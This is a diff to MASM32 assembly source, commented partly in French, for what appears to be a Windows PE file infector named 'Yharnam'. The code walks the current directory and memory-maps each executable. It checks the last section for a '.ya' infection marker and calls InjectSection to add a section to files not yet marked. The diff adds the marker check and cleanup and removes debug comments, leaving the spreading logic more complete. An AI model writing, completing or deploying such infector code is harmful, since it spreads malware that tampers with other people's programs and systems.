@@ -32,7 +32,7 @@ includelib C:\masm32\lib\masm32.lib
 	; Addresse de l'exe mappé
 	;
 	mappedAddr		dd		0
-	
+	sectionName		db		".ya",0
 	;
 	;	- Header infos
 	;
@@ -157,12 +157,8 @@ GetInfoPE proc
  	cmp di, 014Ch
  	jne MachineSuccess
 	mov machine86, 1
-MachineSuccess:
-	;mov cl, machine86
-	;invoke MessageBox, 0, uhex$(ecx), ADDR machineL, MB_OK
-	
+MachineSuccess:	
 	; Sections numbers
-	;mov esi, imgFileHeader
 	lea edi, [esi].IMAGE_FILE_HEADER.NumberOfSections
 	mov di, [edi]
 	mov nbSections, di
@@ -215,12 +211,27 @@ BLastSection:
 	test ecx, ecx
 	jz BLastSectionEnd
 	mov lastSection, esi
+	
+	;cmp section name with ".ya"
+	lea edi, sectionName
+	push ecx
+	mov ecx, 3
+	cld
+	repe cmpsb
+	pop ecx
+	mov esi, lastSection
+	jne NextSection
+	mov eax, 0
+	ret
+	
+NextSection:
 	add esi, SIZEOF IMAGE_SECTION_HEADER
 	dec ecx
 	jmp BLastSection
 BLastSectionEnd:
 	mov esi, lastSection
 	invoke MessageBox, 0, esi, ADDR lastSectionL, MB_OK
+	
 	mov eax, lastSection
 	ret
 GetLastSection endp
@@ -393,32 +404,17 @@ MapExe proc path:DWORD
 	jz MapExeEnd
 	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
 
-	;
-	;
-	;  L'executable est mappé en memoire.
-	;
-	;
-	
-	; set entryPoint
-	; set nbSections
 	invoke GetInfoPE
 	
-	;
-	; Ajout d'une section dans l'executable.
-	;
-	;	- Rajouter une IMAGE_SECTION_HEADER à la fin du header de sections
-	;				
-	;       - Name[IMAGE_SIZEOF_SHORT_NAME] => Nom de la section
-	;		- DWORD |PhysicalAdresse + VirutSize
-	;		- DWORD VirtualAddress => Address premier byte de la section
-	;		-
 	invoke GetLastSection
-	invoke InjectSection, eax
+	test eax, eax
+	jz UnmapExe
 	
-	 
-	;invoke OverwriteEntryPoint, 00414243h
-	;invoke DisplayEntryPoint
-	;invoke SectionTable
+	invoke InjectSection, eax
+
+UnmapExe:
+	invoke UnmapViewOfFile, mappedAddr
+	invoke CloseHandle, hfile
 MapExeEnd:
 	ret
 MapExe endp
@@ -443,39 +439,26 @@ ProcessFile proc uses edi edx Directory:PTR BYTE, File:PTR BYTE
 	jz ProcessFileEnd
 	
 	invoke MessageBox, 0, ADDR fileTarget, ADDR listTargetL, MB_OK
- 	invoke MapExe, ADDR fileTarget
- 	;
- 	; Mapping de l'exe
- 	;
- 	
+ 	invoke MapExe, ADDR fileTarget 	
 ProcessFileEnd:
 	ret
 ProcessFile endp
-
-;
-;
-;
-align 4
 
 Yharnam proc uses esi edi Directory:PTR BYTE
 	local hfile:HANDLE
 	local ffd:WIN32_FIND_DATA
 	local directoryFilter[128]:byte
 	
-	; Rajoute "*" pour le filtre
+	; Add "*"
 	invoke StrLen, Directory
 	lea edi, directoryFilter
 	add edi, eax
 	mov WORD PTR [edi], 002Ah
 	
 	invoke MemCopy, Directory, ADDR directoryFilter, eax
-	
-	;Sinvoke MessageBox, 0, ADDR directoryFilter, ADDR listTargetL, MB_OK
-	
 	invoke FindFirstFile, ADDR directoryFilter, ADDR ffd
 	mov hfile, eax
 
-	;invoke MessageBox, 0, uhex$(eax), ADDR listTargetL, MB_OK
 BDIR:
 	cmp eax, 0
 	je BDIREND
@@ -484,47 +467,25 @@ BDIR:
 	cmp eax, ERROR_NO_MORE_FILES
 	je BDIREND
 	
-	;test eax, eax
- 	;jz BDIREND
- 	;mov eax, 0
- 	
- 	; Mes dans ebx l'addresse de ffd
 	lea esi, ffd
-	; Mes dans edx l'addresse de cFileName
 	lea esi, [esi].WIN32_FIND_DATA.cFileName
-
-	; Affiche le nom du fichiers présent (ADDR du buffer dans edx)
-	;invoke MessageBox, 0, esi, ADDR listTargetL, MB_OK
-	;invoke MessageBox, 0, Directory, ADDR listTargetL, MB_OK
-	
 	invoke ProcessFile, Directory, esi
-	; Le retour de FindNextFile est save dans eax
 	invoke FindNextFile, hfile, ADDR ffd
 	jmp BDIR
 BDIREND:
 	ret
 Yharnam endp
 
-
-; ---------------------------------------------------------
-;	
-; ---------------------------------------------------------
 WinMain proc
-	; Destination pour le path
 	local buff[128]:byte
 
-	; WIN API
 	invoke GetCurrentDirectory, 124, ADDR buff
 	
- 	; Addr "\" to buff
+ 	; Add "\"
  	invoke StrLen, ADDR buff
 	lea edi, buff
 	add edi, eax
 	mov WORD PTR [edi], 005Ch
-	
-	; Affiche le buffer et la taille avant rajout de "\*"
-	;invoke MessageBox, 0, ADDR buff, ADDR pathTargetL, MB_OK	
-	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
 	
 	invoke Yharnam, ADDR buff
 	ret
@@ -532,5 +493,5 @@ WinMain endp
 
 start:
 	invoke WinMain
-    ;invoke ExitProcess, 0
+    invoke ExitProcess, 0
 end start
